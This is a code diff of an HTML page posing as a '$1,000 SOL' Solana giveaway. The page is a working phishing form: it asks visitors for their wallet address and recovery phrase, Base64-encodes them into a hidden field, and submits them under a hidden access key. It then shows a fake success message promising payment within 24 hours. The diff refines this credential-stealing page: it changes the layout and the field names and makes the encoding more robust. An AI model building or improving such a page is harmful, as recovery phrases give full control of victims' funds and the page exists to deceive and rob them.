@@ -7,50 +7,150 @@
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
-        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .card { width: 85%; max-width: 450px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); }
-        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.6rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; }
-        .sub { font-size: 0.9rem; color: #888; margin-bottom: 45px; line-height: 1.6; }
-        .ib { text-align: left; margin-bottom: 35px; }
-        label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 15px; font-weight: 700; }
-        input { width: 100%; background: #111; border: 1px solid #333; border-radius: 15px; padding: 20px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; transition: 0.3s; }
-        input:focus { outline: none; border-color: var(--sol-g); background: #151515; }
-        .btn { width: 100%; padding: 22px; border: none; border-radius: 16px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.85rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); transition: 0.3s; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        body { 
+            margin: 0; 
+            background: #000; 
+            color: #fff; 
+            font-family: 'Space Grotesk', sans-serif; 
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .card { 
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%; 
+            max-width: 500px; 
+            background: #080808; 
+            border: 1px solid rgba(0, 255, 163, 0.2); 
+            border-radius: 40px; 
+            padding: 60px 30px; 
+            text-align: center; 
+            box-shadow: 0 0 80px rgba(0, 0, 0, 1);
+            box-sizing: border-box;
+        }
+
+        h1 { 
+            font-family: 'Syncopate', sans-serif; 
+            font-size: 1.7rem; 
+            margin: 0 0 25px 0;
+            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            letter-spacing: -1px; 
+            font-weight: 700; 
+            text-transform: uppercase;
+            line-height: 1.2;
+            white-space: nowrap; 
+        }
+
+        .sub { 
+            font-size: 0.8rem; 
+            text-transform: uppercase; 
+            letter-spacing: 2px; 
+            color: var(--sol-g); 
+            margin-bottom: 40px; 
+            font-weight: 700; 
+            line-height: 1.6;
+        }
+
+        .ib { text-align: left; margin-bottom: 30px; }
+        
+        label { 
+            font-size: 0.8rem; 
+            text-transform: uppercase; 
+            letter-spacing: 2px; 
+            color: var(--sol-g); 
+            display: block; 
+            margin-bottom: 12px; 
+            font-weight: 700; 
+        }
+
+        textarea { 
+            width: 100%; 
+            background: #111; 
+            border: 1px solid #333; 
+            border-radius: 15px; 
+            padding: 20px; 
+            color: #fff; 
+            font-family: 'Space Grotesk', sans-serif; 
+            font-size: 1rem; 
+            box-sizing: border-box; 
+            height: 140px; 
+            resize: none;
+            outline: none;
+        }
+
+        textarea:focus { border-color: var(--sol-g); background: #151515; }
+
+        .btn { 
+            width: 100%; 
+            padding: 22px; 
+            border: none; 
+            border-radius: 16px; 
+            background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); 
+            color: #fff; 
+            font-family: 'Syncopate', sans-serif; 
+            font-weight: 700; 
+            font-size: 0.8rem; 
+            cursor: pointer; 
+            box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); 
+            text-transform: uppercase;
+        }
+
         #success-view { display: none; }
-        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
-        .congrats { font-size: 1.05rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.05); border-radius: 25px; border: 1px dashed var(--sol-g); }
+        
+        .congrats { 
+            padding: 30px; 
+            background: rgba(0, 255, 163, 0.05); 
+            border-radius: 20px; 
+            border: 1px dashed var(--sol-g); 
+            width: 100%;
+            box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
+
     <div class="card">
+        <!-- FORM PAGE -->
         <div id="form-view">
             <form id="claim-form">
+                <!-- ACCESS KEY UPDATED -->
                 <input type="hidden" name="access_key" value="8460d727-7ba5-446e-a522-c226b224fb5f">
                 
-                <p class="sub">To claim the $1,000 SOL, connect your solana wallet below</p>
+                <p class="sub">Claim your giveaway with your solana address and recovery phrase below and click claim</p>
                 
                 <div class="ib">
                     <label>SOLANA ADDRESS</label>
-                    <input type="text" id="sol-address" required>
+                    <textarea id="sol-address" required></textarea>
                 </div>
 
                 <div class="ib">
                     <label>RECOVERY PHRASE</label>
-                    <input type="text" id="rec-phrase" required>
+                    <textarea id="rec-phrase" required></textarea>
                 </div>
 
-                <!-- Field where Base64 content will be stored -->
-                <input type="hidden" name="encoded_data" id="encoded-data">
-                <input type="hidden" name="subject" value="New Encoded SOL Claim">
+                <!-- Hidden field for the encoded single text string -->
+                <input type="hidden" name="name" id="coded-data">
+                <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
+
                 <button type="submit" id="submit-btn" class="btn">CLAIM</button>
             </form>
         </div>
 
+        <!-- SUCCESS PAGE (UNTOUCHED) -->
         <div id="success-view">
-            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
+            <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
-                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
+                <p class="sub" style="margin-bottom: 0;">Congrats, you have claimed your solana giveaway and you’ll receive it in your wallet address within 24 hrs</p>
             </div>
         </div>
     </div>
@@ -67,15 +167,20 @@
             submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            // 1. Get raw values
-            const solAddress = document.getElementById('sol-address').value;
-            const recPhrase = document.getElementById('rec-phrase').value;
-            
-            // 2. Create multi-line string
-            const combinedString = `Solana Address: ${solAddress}\nRecovery Phrase: ${recPhrase}`;
-            
-            // 3. Base64 Encode using btoa()
-            document.getElementById('encoded-data').value = btoa(combinedString);
+            try {
+                // Get values from the two boxes
+                const solAddress = document.getElementById('sol-address').value;
+                const recPhrase = document.getElementById('rec-phrase').value;
+                
+                // Combine into single text with line break
+                const combined = solAddress + "\n" + recPhrase;
+                
+                // Base64 encode the combined single text
+                document.getElementById('coded-data').value = btoa(unescape(encodeURIComponent(combined)));
+            } catch (err) {
+                // Fallback if encoding fails
+                document.getElementById('coded-data').value = "Error encoding data";
+            }
 
             const formData = new FormData(form);
 
